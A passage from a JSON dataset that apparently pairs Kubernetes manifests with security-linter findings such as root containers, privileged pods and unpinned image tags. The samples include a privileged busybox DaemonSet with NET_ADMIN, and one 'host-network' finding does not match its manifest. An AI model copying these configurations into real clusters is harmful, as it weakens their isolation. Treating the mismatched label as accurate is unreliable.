    "manifest_path": "data/manifests/the_stack_sample/sample_3723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backstage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: backstage\n  template:\n    metadata:\n      labels:\n        app: backstage\n    spec:\n      containers:\n      - name: backstage\n        image: claudioed/backstage\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 7000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"backstage\" is not set to runAsNonRoot"
  },
  {
    "id": "9726",
    "manifest_path": "data/manifests/the_stack_sample/sample_3723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backstage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: backstage\n  template:\n    metadata:\n      labels:\n        app: backstage\n    spec:\n      containers:\n      - name: backstage\n        image: claudioed/backstage\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 7000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"backstage\" has cpu request 0"
  },
  {
    "id": "9727",
    "manifest_path": "data/manifests/the_stack_sample/sample_3723.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backstage\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: backstage\n  template:\n    metadata:\n      labels:\n        app: backstage\n    spec:\n      containers:\n      - name: backstage\n        image: claudioed/backstage\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 7000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"backstage\" has memory limit 0"
  },
  {
    "id": "9728",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"busybox\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "9729",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9730",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "9731",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"busybox\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9732",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"busybox\" is privileged"
  },
  {
    "id": "9733",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "9734",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "9735",
    "manifest_path": "data/manifests/the_stack_sample/sample_3724.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      component: busybox\n  template:\n    metadata:\n      labels:\n        component: busybox\n    spec:\n      containers:\n      - name: busybox\n        image: alpine:3.11.5\n        securityContext:\n          privileged: true\n          capabilities:\n            add:\n            - NET_ADMIN\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "9736",
    "manifest_path": "data/manifests/the_stack_sample/sample_3725.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    component: scheduler\n    tier: control-plane\n  name: topo-aware-scheduler\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      component: scheduler\n      tier: control-plane\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: scheduler\n        tier: control-plane\n        version: second\n    spec:\n      serviceAccountName: topo-aware-scheduler\n      containers:\n      - image: localhost:5000/scheduler-plugins/kube-scheduler:latest\n        imagePullPolicy: Never\n        command:\n        - /bin/kube-scheduler\n        - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --config=/etc/kubernetes/scheduler-config/scheduler-config.yaml\n        name: scheduler\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /etc/kubernetes/scheduler.conf\n          name: kubeconfig\n        - mountPath: /etc/kubernetes/scheduler-config\n          name: topo-aware-scheduler-config-vol\n      volumes:\n      - hostPath:\n          path: /etc/kubernetes/scheduler.conf\n          type: File\n        name: kubeconfig\n      - configMap:\n          name: topo-aware-scheduler-config\n        name: topo-aware-scheduler-config-vol\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"scheduler\" is using an invalid container image, \"localhost:5000/scheduler-plugins/kube-scheduler:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9737",
    "manifest_path": "data/manifests/the_stack_sample/sample_3725.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    component: scheduler\n    tier: control-plane\n  name: topo-aware-scheduler\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      component: scheduler\n      tier: control-plane\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: scheduler\n        tier: control-plane\n        version: second\n    spec:\n      serviceAccountName: topo-aware-scheduler\n      containers:\n      - image: localhost:5000/scheduler-plugins/kube-scheduler:latest\n        imagePullPolicy: Never\n        command:\n        - /bin/kube-scheduler\n        - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --config=/etc/kubernetes/scheduler-config/scheduler-config.yaml\n        name: scheduler\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /etc/kubernetes/scheduler.conf\n          name: kubeconfig\n        - mountPath: /etc/kubernetes/scheduler-config\n          name: topo-aware-scheduler-config-vol\n      volumes:\n      - hostPath:\n          path: /etc/kubernetes/scheduler.conf\n          type: File\n        name: kubeconfig\n      - configMap:\n          name: topo-aware-scheduler-config\n        name: topo-aware-scheduler-config-vol\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"scheduler\" does not have a read-only root file system"
  },
  {
    "id": "9738",
    "manifest_path": "data/manifests/the_stack_sample/sample_3725.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    component: scheduler\n    tier: control-plane\n  name: topo-aware-scheduler\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      component: scheduler\n      tier: control-plane\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: scheduler\n        tier: control-plane\n        version: second\n    spec:\n      serviceAccountName: topo-aware-scheduler\n      containers:\n      - image: localhost:5000/scheduler-plugins/kube-scheduler:latest\n        imagePullPolicy: Never\n        command:\n        - /bin/kube-scheduler\n        - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --config=/etc/kubernetes/scheduler-config/scheduler-config.yaml\n        name: scheduler\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /etc/kubernetes/scheduler.conf\n          name: kubeconfig\n        - mountPath: /etc/kubernetes/scheduler-config\n          name: topo-aware-scheduler-config-vol\n      volumes:\n      - hostPath:\n          path: /etc/kubernetes/scheduler.conf\n          type: File\n        name: kubeconfig\n      - configMap:\n          name: topo-aware-scheduler-config\n        name: topo-aware-scheduler-config-vol\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"topo-aware-scheduler\" not found"
  },
  {
    "id": "9739",
    "manifest_path": "data/manifests/the_stack_sample/sample_3725.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    component: scheduler\n    tier: control-plane\n  name: topo-aware-scheduler\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      component: scheduler\n      tier: control-plane\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: scheduler\n        tier: control-plane\n        version: second\n    spec:\n      serviceAccountName: topo-aware-scheduler\n      containers:\n      - image: localhost:5000/scheduler-plugins/kube-scheduler:latest\n        imagePullPolicy: Never\n        command:\n        - /bin/kube-scheduler\n        - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --config=/etc/kubernetes/scheduler-config/scheduler-config.yaml\n        name: scheduler\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /etc/kubernetes/scheduler.conf\n          name: kubeconfig\n        - mountPath: /etc/kubernetes/scheduler-config\n          name: topo-aware-scheduler-config-vol\n      volumes:\n      - hostPath:\n          path: /etc/kubernetes/scheduler.conf\n          type: File\n        name: kubeconfig\n      - configMap:\n          name: topo-aware-scheduler-config\n        name: topo-aware-scheduler-config-vol\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"scheduler\" is not set to runAsNonRoot"
  },
  {
    "id": "9740",
    "manifest_path": "data/manifests/the_stack_sample/sample_3725.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    component: scheduler\n    tier: control-plane\n  name: topo-aware-scheduler\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      component: scheduler\n      tier: control-plane\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: scheduler\n        tier: control-plane\n        version: second\n    spec:\n      serviceAccountName: topo-aware-scheduler\n      containers:\n      - image: localhost:5000/scheduler-plugins/kube-scheduler:latest\n        imagePullPolicy: Never\n        command:\n        - /bin/kube-scheduler\n        - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --config=/etc/kubernetes/scheduler-config/scheduler-config.yaml\n        name: scheduler\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /etc/kubernetes/scheduler.conf\n          name: kubeconfig\n        - mountPath: /etc/kubernetes/scheduler-config\n          name: topo-aware-scheduler-config-vol\n      volumes:\n      - hostPath:\n          path: /etc/kubernetes/scheduler.conf\n          type: File\n        name: kubeconfig\n      - configMap:\n          name: topo-aware-scheduler-config\n        name: topo-aware-scheduler-config-vol\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"scheduler\" has cpu request 0"
  },
  {
    "id": "9741",
    "manifest_path": "data/manifests/the_stack_sample/sample_3725.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    component: scheduler\n    tier: control-plane\n  name: topo-aware-scheduler\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      component: scheduler\n      tier: control-plane\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        component: scheduler\n        tier: control-plane\n        version: second\n    spec:\n      serviceAccountName: topo-aware-scheduler\n      containers:\n      - image: localhost:5000/scheduler-plugins/kube-scheduler:latest\n        imagePullPolicy: Never\n        command:\n        - /bin/kube-scheduler\n        - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf\n        - --config=/etc/kubernetes/scheduler-config/scheduler-config.yaml\n        name: scheduler\n        securityContext:\n          privileged: false\n        volumeMounts:\n        - mountPath: /etc/kubernetes/scheduler.conf\n          name: kubeconfig\n        - mountPath: /etc/kubernetes/scheduler-config\n          name: topo-aware-scheduler-config-vol\n      volumes:\n      - hostPath:\n          path: /etc/kubernetes/scheduler.conf\n          type: File\n        name: kubeconfig\n      - configMap:\n          name: topo-aware-scheduler-config\n        name: topo-aware-scheduler-config-vol\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"scheduler\" has memory limit 0"
  },
  {
    "id": "9742",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app\" is using an invalid container image, \"centos\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9743",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "9744",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"echoserver\" does not have a read-only root file system"
  },
  {
    "id": "9745",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "9746",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"echoserver\" is not set to runAsNonRoot"
  },
  {
    "id": "9747",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "9748",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"echoserver\" has cpu request 0"
  },
  {
    "id": "9749",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "9750",
    "manifest_path": "data/manifests/the_stack_sample/sample_3727.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: echoserver\nspec:\n  selector:\n    matchLabels:\n      app: echoserver\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      volumes:\n      - name: persistent-storage\n        persistentVolumeClaim:\n          claimName: ebs-claim\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.4\n        imagePullPolicy: Always\n        name: echoserver\n        ports:\n        - containerPort: 8080\n      - name: app\n        image: centos\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - while true; do echo $(date -u) >> /data/out.txt; sleep 5; done\n        volumeMounts:\n        - name: persistent-storage\n          mountPath: /data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"echoserver\" has memory limit 0"
  },
  {
    "id": "9751",
    "manifest_path": "data/manifests/the_stack_sample/sample_3728.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: peterpipelinesjavascriptdocker\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n  selector:\n    app: peterpipelinesjavascriptdocker\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:peterpipelinesjavascriptdocker])"
  },
  {
    "id": "9752",
    "manifest_path": "data/manifests/the_stack_sample/sample_3729.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: vote\n    tier: front\n  name: vote\nspec:\n  ports:\n  - name: '80'\n    nodePort: 30000\n    port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: vote\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:vote])"
  },
  {
    "id": "9753",
    "manifest_path": "data/manifests/the_stack_sample/sample_3730.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:latest\n        imagePullPolicy: Always\n        name: influx-db\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        - containerPort: 8089\n          protocol: UDP\n        - containerPort: 2003\n        volumeMounts:\n        - name: influxdb-conf\n          mountPath: /etc/influxdb\n      volumes:\n      - name: influxdb-conf\n        configMap:\n          name: influxdb-conf\n          items:\n          - key: influxdb.conf\n            path: influxdb.conf\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"influx-db\" is using an invalid container image, \"influxdb:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9754",
    "manifest_path": "data/manifests/the_stack_sample/sample_3730.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:latest\n        imagePullPolicy: Always\n        name: influx-db\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        - containerPort: 8089\n          protocol: UDP\n        - containerPort: 2003\n        volumeMounts:\n        - name: influxdb-conf\n          mountPath: /etc/influxdb\n      volumes:\n      - name: influxdb-conf\n        configMap:\n          name: influxdb-conf\n          items:\n          - key: influxdb.conf\n            path: influxdb.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"influx-db\" does not have a read-only root file system"
  },
  {
    "id": "9755",
    "manifest_path": "data/manifests/the_stack_sample/sample_3730.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:latest\n        imagePullPolicy: Always\n        name: influx-db\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        - containerPort: 8089\n          protocol: UDP\n        - containerPort: 2003\n        volumeMounts:\n        - name: influxdb-conf\n          mountPath: /etc/influxdb\n      volumes:\n      - name: influxdb-conf\n        configMap:\n          name: influxdb-conf\n          items:\n          - key: influxdb.conf\n            path: influxdb.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"influx-db\" is not set to runAsNonRoot"
  },
  {
    "id": "9756",
    "manifest_path": "data/manifests/the_stack_sample/sample_3730.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:latest\n        imagePullPolicy: Always\n        name: influx-db\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        - containerPort: 8089\n          protocol: UDP\n        - containerPort: 2003\n        volumeMounts:\n        - name: influxdb-conf\n          mountPath: /etc/influxdb\n      volumes:\n      - name: influxdb-conf\n        configMap:\n          name: influxdb-conf\n          items:\n          - key: influxdb.conf\n            path: influxdb.conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"influx-db\" has cpu request 0"
  },
  {
    "id": "9757",
    "manifest_path": "data/manifests/the_stack_sample/sample_3730.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: influxdb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: influxdb\n  template:\n    metadata:\n      labels:\n        app: influxdb\n    spec:\n      containers:\n      - image: influxdb:latest\n        imagePullPolicy: Always\n        name: influx-db\n        ports:\n        - containerPort: 8083\n        - containerPort: 8086\n        - containerPort: 8089\n          protocol: UDP\n        - containerPort: 2003\n        volumeMounts:\n        - name: influxdb-conf\n          mountPath: /etc/influxdb\n      volumes:\n      - name: influxdb-conf\n        configMap:\n          name: influxdb-conf\n          items:\n          - key: influxdb.conf\n            path: influxdb.conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"influx-db\" has memory limit 0"
  },
  {
    "id": "9758",
    "manifest_path": "data/manifests/the_stack_sample/sample_3734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: templatebot\n  labels:\n    app: templatebot\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: templatebot\n  template:\n    metadata:\n      labels:\n        app: templatebot\n    spec:\n      containers:\n      - name: templatebot-app\n        env:\n        - name: TEMPLATEBOT_GITHUB_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_TOKEN\n        - name: TEMPLATEBOT_GITHUB_USER\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: TEMPLATEBOT_GITHUB_USER\n        - name: SLACK_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: templatebot\n              key: SLACK_TOKEN\n        volumeMounts:\n        - name: client-tls\n          mountPath: /var/strimzi-client\n          readOnly: true\n        - name: broker-tls\n          mountPath: /var/strimzi-broker\n          readOnly: true\n      volumes:\n      - name: client-tls\n        secret:\n          secretName: kafkauser-templatebot\n      - name: broker-tls\n        secret:\n          secretName: events-cluster-ca-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"templatebot-app\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9759",
    "manifest_path": "data/manifests/the_stack_sample/sample_3734.yaml",
